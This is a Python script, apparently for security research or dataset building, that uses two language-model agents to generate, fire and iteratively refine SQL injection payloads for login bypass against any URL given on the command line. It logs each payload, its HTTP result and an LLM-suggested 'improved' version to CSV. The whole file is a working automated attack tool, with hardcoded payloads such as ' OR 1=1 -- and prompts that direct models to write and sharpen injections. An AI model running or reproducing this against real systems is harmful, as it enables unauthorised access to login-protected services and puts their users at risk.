import time
import csv
import json
import os
import re
import argparse
import random
from datetime import datetime
from autogen import AssistantAgent
from utils.cleaner import clean_payload
from utils.test_payload import test_payload
from utils.llm_config import vicuna, mistral_lowtemp

# === Agents ===
def create_generator_agent():
    return AssistantAgent(name="GeneratorAgent", llm_config=vicuna)

def create_discriminator_agent():
    return AssistantAgent(
        name="DiscriminatorAgent",
        system_message="""
You are a security testing expert.
Return ONLY valid JSON with keys: classification, reasoning, improvement, improved_payload.
- classification: One of ["Login Bypass","Error-based SQL Injection","Time-based SQL Injection","No Effect","Invalid Payload"]
- reasoning: Explain why classification was chosen and give specific suggestion to improve THIS payload.
- improvement: Summarize changes needed.
- improved_payload: A suggested improved SQL injection payload.
Do not add any text outside JSON.
""",
        llm_config=mistral_lowtemp
    )

# === JSON Extractor ===
def extract_json(content):
    content = re.sub(r"```[a-zA-Z]*", "", content).replace("```", "").strip()
    match = re.search(r"\{.*\}", content, re.DOTALL)
    if not match:
        return None
    try:
        return json.loads(match.group(0))
    except json.JSONDecodeError:
        return None

# === Validate Payload ===
def validate_payload(payload):
    if not isinstance(payload, str) or payload.strip() == "":
        return False
    p = payload.lower()
    if any(term in p for term in ["vbnet", "terminate", "nan"]):
        return False
    sql_terms = ["select", "union", "or", "--", ";", "'"]
    return any(term in p for term in sql_terms)

# === Fallback New Payload ===
def fallback_new_payload(generator, used_payloads):
    fallback_prompt = f"""
Generate one brand new SQL injection payload for login bypass or error-based testing.
Avoid using any of these already used payloads:
{chr(10).join(used_payloads)}

Only output one raw payload:
- No numbering
- No markdown
- No explanation
"""
    response = generator.generate_reply(messages=[{"role": "user", "content": fallback_prompt}], max_tokens=64)
    new_payload = clean_payload(response.get("content", "").strip())
    # Ensure uniqueness even if model repeats
    if new_payload in used_payloads or not validate_payload(new_payload):
        new_payload = f"' OR 1=1 --X{random.randint(1000,9999)}"
    return new_payload

# === Run Discriminator ===
def run_discriminator(discriminator, payload, http_response, elapsed):
    analysis_prompt = f"""
Payload: {payload}
HTTP Status: {http_response.status_code}
Response Time: {elapsed:.2f}s
Response Body (truncated to 1000 chars):
{http_response.text[:1000] if hasattr(http_response, "text") else ""}

Return JSON ONLY with:
- classification
- reasoning (must include how to improve THIS payload)
- improvement
- improved_payload
"""
    response = discriminator.generate_reply(messages=[{"role": "user", "content": analysis_prompt}], max_tokens=512)
    parsed = extract_json(response.get("content", "").strip())
    if parsed:
        return parsed
    else:
        return {
            "classification": "ParseError",
            "reasoning": response.get("content", ""),
            "improvement": "Retry improvement",
            "improved_payload": "' OR 1=1 --"
        }

# === Run Conversation ===
def run_conversation(url, iterations=5, output_file="datasets/multi_agent_output/conversation_dataset.csv"):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    generator = create_generator_agent()
    discriminator = create_discriminator_agent()

    used_payloads = set()

    with open(output_file, "w", newline="") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=[
            "iteration", "initial_payload", "classification", "reasoning",
            "discriminator_improved_payload", "generator_final_payload", "test_result"
        ])
        writer.writeheader()

        for i in range(iterations):
            print(f"\n=== Iteration {i+1}/{iterations} ===")

            # === Step 1: Generate initial payload ===
            gen_prompt = "Generate one SQL injection payload for login bypass or error-based testing. Only raw payload."
            initial_reply = generator.generate_reply(messages=[{"role": "user", "content": gen_prompt}], max_tokens=64)
            initial_payload = clean_payload(initial_reply.get("content", "").strip())
            if not validate_payload(initial_payload) or initial_payload in used_payloads:
                initial_payload = fallback_new_payload(generator, used_payloads)

            used_payloads.add(initial_payload)

            # === Step 2: Test payload ===
            start = time.time()
            http_response = test_payload(initial_payload, start, url=url, return_http_response=True)
            elapsed = time.time() - start

            # === Step 3: Discriminator analysis ===
            disc_result = run_discriminator(discriminator, initial_payload, http_response, elapsed)
            disc_payload = clean_payload(disc_result.get("improved_payload", "").strip())

            # === Step 4: Generator refines using discriminator reasoning ===
            refine_prompt = f"""
Payload to improve: {initial_payload}
Discriminator reasoning: {disc_result.get("reasoning","")}
Suggested improvement: {disc_result.get("improvement","")}
Use the reasoning and suggestion to create a final improved payload.
Only output the payload:
- No explanation
- No markdown
"""
            refined_reply = generator.generate_reply(messages=[{"role": "user", "content": refine_prompt}], max_tokens=64)
            generator_final_payload = clean_payload(refined_reply.get("content", "").strip())

            if not validate_payload(generator_final_payload) or generator_final_payload in used_payloads:
                generator_final_payload = fallback_new_payload(generator, used_payloads)

            used_payloads.add(generator_final_payload)

            # === Save to CSV ===
            writer.writerow({
                "iteration": i+1,
                "initial_payload": initial_payload,
                "classification": disc_result.get("classification", ""),
                "reasoning": disc_result.get("reasoning", ""),
                "discriminator_improved_payload": disc_payload,
                "generator_final_payload": generator_final_payload,
                "test_result": http_response.status_code
            })
            csvfile.flush()

            print(f"Payload: {initial_payload}")
            print(f" -> Classification: {disc_result.get('classification')}")
            print(f" -> Reasoning: {disc_result.get('reasoning')}")
            print(f" -> Discriminator Improved Payload: {disc_payload}")
            print(f" -> Generator Final Payload: {generator_final_payload}\n")

    print(f"\nConversation complete. Results saved to {output_file}")


# === Entry Point ===
if __name__ == "__main__":
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    default_output_file = f"datasets/multi_agent_output/conversation_dataset_{timestamp}.csv"
    parser = argparse.ArgumentParser(description="Multi-Agent SQL Injection Conversation Script")
    parser.add_argument("--url", required=True, help="Target login URL")
    parser.add_argument("--iterations", type=int, default=50, help="Number of iterations")
    parser.add_argument("--output", default=default_output_file, help="Path to output CSV file")
    args = parser.parse_args()

    run_conversation(url=args.url, iterations=args.iterations, output_file=args.output)